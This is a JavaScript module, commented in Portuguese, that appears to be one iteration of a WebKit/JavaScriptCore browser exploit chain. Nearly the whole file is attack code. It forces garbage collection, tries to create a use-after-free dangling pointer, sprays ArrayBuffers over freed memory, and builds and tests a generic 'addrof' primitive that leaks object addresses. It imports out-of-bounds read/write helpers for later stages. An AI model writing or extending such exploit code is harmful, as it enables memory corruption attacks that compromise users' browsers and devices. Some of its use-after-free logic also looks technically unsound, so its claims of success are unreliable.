// js/script3/testArrayBufferVictimCrash.mjs (v82_AdvancedGetterLeak - R59 - Construção de Primitiva Addrof Genérica)
// =======================================================================================
// O R58 provou que a escrita arbitrária "cega" é instável.
// ESTA VERSÃO MUDA O FOCO: em vez de tentar a cadeia completa, vamos usar nosso UAF estável
// para construir uma ferramenta essencial e reutilizável: uma função addrof(obj) genérica.
// - A FASE 6 foi completamente refeita para definir e testar essa nova função.
// =======================================================================================

import { logS3, PAUSE_S3 } from './s3_utils.mjs';
import { AdvancedInt64, toHex, isAdvancedInt64Object } from '../utils.mjs';
import {
    triggerOOB_primitive,
    clearOOBEnvironment,
    oob_read_absolute,
    oob_write_absolute,
    selfTestOOBReadWrite,
} from '../core_exploit.mjs';
import { JSC_OFFSETS, WEBKIT_LIBRARY_INFO } from '../config.mjs';

export const FNAME_MODULE_TYPEDARRAY_ADDROF_V82_AGL_R43_WEBKIT = "OriginalHeisenbug_TypedArrayAddrof_v82_AGL_R59_Generic_Addrof";

function int64ToDouble(int64) {
    const buf = new ArrayBuffer(8);
    const u32 = new Uint32Array(buf);
    const f64 = new Float64Array(buf);
    u32[0] = int64.low();
    u32[1] = int64.high();
    return f64[0];
}

// Helper para a conversão inversa, que usaremos em nossa nova função addrof
function doubleToInt64(d) {
    const buf = new ArrayBuffer(8);
    const f64 = new Float64Array(buf);
    const u32 = new Uint32Array(buf);
    f64[0] = d;
    return new AdvancedInt64(u32[0], u32[1]);
}

// =======================================================================================
// FUNÇÃO ORQUESTRADORA PRINCIPAL (R59 - Generic Addrof)
// =======================================================================================
export async function executeTypedArrayVictimAddrofAndWebKitLeak_R43() {
    const FNAME_CURRENT_TEST_BASE = FNAME_MODULE_TYPEDARRAY_ADDROF_V82_AGL_R43_WEBKIT;
    logS3(`--- Iniciando ${FNAME_CURRENT_TEST_BASE}: Construindo Addrof Genérico (R59) ---`, "test");
    
    let final_result = { success: false, message: "A cadeia UAF não obteve sucesso." };
    let dangling_ref = null;

    try {
        // FASES 1-5: Mantidas, pois são a base para obter a nossa ferramenta UAF.
        logS3("--- FASE 1: Limpeza Agressiva Inicial do Heap ---", "subtest");
        await triggerGC_Tamed();
        logS3("--- FASE 2: Criando um ponteiro pendurado (Use-After-Free) ---", "subtest");
        dangling_ref = sprayAndCreateDanglingPointer();
        logS3("    Ponteiro pendurado criado. A referência agora é inválida.", "warn");
        logS3("--- FASE 3: Múltiplas chamadas de GC para garantir a liberação ---", "subtest");
        await triggerGC_Tamed();
        await PAUSE_S3(100);
        await triggerGC_Tamed();
        logS3("    Memória do objeto-alvo deve ter sido liberada.", "warn");
        logS3("--- FASE 4: Pulverizando ArrayBuffers sobre a memória liberada ---", "subtest");
        // A pulverização é necessária para que o 'dangling_ref' aponte para um ArrayBuffer
        const spray_buffers = [];
        for (let i = 0; i < 1024; i++) {
            spray_buffers.push(new ArrayBuffer(136));
        }
        logS3(`    Pulverização de ${spray_buffers.length} buffers concluída.`, "info");
        logS3(`DEBUG: typeof dangling_ref.corrupted_prop é: ${typeof dangling_ref.corrupted_prop}`, "info");
        if (typeof dangling_ref.corrupted_prop !== 'number') {
            throw new Error(`Falha no UAF. Tipo da propriedade era '${typeof dangling_ref.corrupted_prop}', esperado 'number'.`);
        }
        logS3("++++++++++++ SUCESSO! CONFUSÃO DE TIPOS VIA UAF OCORREU! ++++++++++++", "vuln");
        
        // FASE 6: Construir e Testar a Primitiva 'addrof' Genérica
        logS3("--- FASE 6: Construindo e Testando a Primitiva 'addrof' Genérica ---", "subtest");

        // Nossa ferramenta principal: a função addrof
        function addrof(obj) {
            // Usamos a referência confusa para transformar um objeto em seu endereço
            dangling_ref.prop_a = obj;
            const leaked_double = dangling_ref.prop_a;
            return doubleToInt64(leaked_double);
        }

        logS3("    Função 'addrof' definida. Testando...", "info");

        // Criamos objetos de teste para encontrar seus endereços
        const test_obj1 = { value: 0xAAAAAAAA };
        const test_obj2 = { value: 0xBBBBBBBB };

        const addr1 = addrof(test_obj1);
        const addr2 = addrof(test_obj2);

        logS3(`Endereço do test_obj1: ${addr1.toString(true)}`, "leak");
        logS3(`Endereço do test_obj2: ${addr2.toString(true)}`, "leak");

        // Verificação de sanidade
        if (!isAdvancedInt64Object(addr1) || !isAdvancedInt64Object(addr2)) {
            throw new Error("addrof não retornou um objeto AdvancedInt64 válido.");
        }
        if (addr1.equals(addr2)) {
            throw new Error("addrof retornou o mesmo endereço para dois objetos diferentes.");
        }
        if (addr1.low() === 0 && addr1.high() === 0) {
            throw new Error("addrof retornou um endereço nulo para test_obj1.");
        }
        
        logS3("++++++++++++ SUCESSO! PRIMITIVA 'addrof' GENÉRICA FUNCIONAL! ++++++++++++", "vuln");

        final_result = { 
            success: true, 
            message: "Primitiva 'addrof' genérica construída e validada com sucesso!",
            test_addrs: [addr1.toString(true), addr2.toString(true)]
        };

    } catch (e) {
        final_result.message = `Exceção na cadeia UAF: ${e.message}`;
        logS3(final_result.message, "critical");
    }

    logS3(`--- ${FNAME_CURRENT_TEST_BASE} Concluído ---`, "test");
    return {
        errorOccurred: final_result.success ? null : final_result.message,
        addrof_result: final_result,
        webkit_leak_result: { success: final_result.success, msg: final_result.message },
        heisenbug_on_M2_in_best_result: final_result.success
    };
}


// --- Funções Auxiliares (sem alterações do R58) ---
async function triggerGC_Tamed() {
    logS3("    Acionando GC Domado (Tamed)...", "info");
    try {
        const gc_trigger_arr = [];
        for (let i = 0; i < 500; i++) {
            const size = Math.min(1024 * i, 1024 * 1024);
            gc_trigger_arr.push(new ArrayBuffer(size)); 
            gc_trigger_arr.push(new Array(size / 8).fill(0));
        }
    } catch (e) {
        logS3("    Memória esgotada durante o GC Domado, o que é esperado e bom.", "info");
    }
    await PAUSE_S3(500);
}

function sprayAndCreateDanglingPointer() {
    let dangling_ref_internal = null;
    function createScope() {
        const victim = {
            prop_a: 0.1, // Alvo para nossa função addrof
            prop_b: 0.2, // Alvo futuro para arb_write
            corrupted_prop: 0.3,
            p4: 0, p5: 0, p6: 0, p7: 0, p8: 0, p9: 0, p10: 0, p11: 0, p12: 0, p13: 0, p14: 0, p15: 0,
            p16: 0, p17: 0
        };
        dangling_ref_internal = victim; 
        for(let i=0; i<100; i++) {
            victim.prop_a += 1;
        }
    }
    createScope();
    return dangling_ref_internal;
}
